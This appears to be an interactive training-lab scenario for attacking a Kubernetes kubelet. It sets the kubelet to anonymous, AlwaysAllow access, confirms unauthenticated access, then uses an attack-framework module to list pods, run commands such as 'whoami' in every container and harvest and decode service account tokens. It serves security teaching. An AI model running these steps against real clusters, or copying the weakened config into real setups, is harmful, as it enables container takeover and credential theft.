#### Prepare the enviornment  


For this scenario we will need to do some changes for kubelet:  
```
if [ -f "/var/lib/kubelet/config.yaml" ]; then
	sed -i 's/    enabled: false/    enabled: true/g' /var/lib/kubelet/config.yaml
    sed -i 's/  mode: Webhook/  mode: AlwaysAllow/g' /var/lib/kubelet/config.yaml
    service kubelet restart
	echo "Kubelet config has been changed"
	else
	  echo "The file /var/lib/kubelet/config.yaml doesn't exist, does the cluster is up?"
fi
```{{execute HOST2}}   

After the change, check from the Master that you can communicate with kubelet without authentication:  
```
if [ `curl -sk  https://node01:10250/healthz` == "ok" ]; then
   echo "Kubelet is configured for anonymous connections"
   else
   echo "Kubelet is NOT configured"
fi
```{{execute T3}}  


#### Load the Kubelet module and run it

Load the kubelet attack module from terminal 1 by running `use module linux/go/kubeletAttack`{{execute T1}}.  

You can view all the information with `info`{{execute T1}} command.  
The module is set automatically to run on all the agents with this command, if it wasn't set it is possible by running `set Agent all`{{execute T1}}.   
We need to set the IP of the target machine, let's find the IP by running `ip addr show ens3  | awk '$1 == "inet" { print $2 }' | cut -d/ -f1`{{execute T3}} in `node1`.  
Now, take this IP address and type in the server `set Url <IP>`, and replace `<IP>` with the IP address we received.  

The default command will run list the pods through kubelet, simply execute it with `run`{{execute T1}} and wait for the output.  

#### Scan for RCE    
We can also change the command by using `set Command rce`{{execute T1}} and `run`{{execute T1}} it.  

#### Run any command 
 
Change the command by using `set Command run -a whoami`{{execute T1}} and `run`{{execute T1}} it.   
It will run the `whoami` command on all the available containers.  

#### Scan for tokens
Change the command by using `set Command token`{{execute T1}} and `run`{{execute T1}} it.   
It will go over any available container and search for the mounted service account token of the container and decode it.    


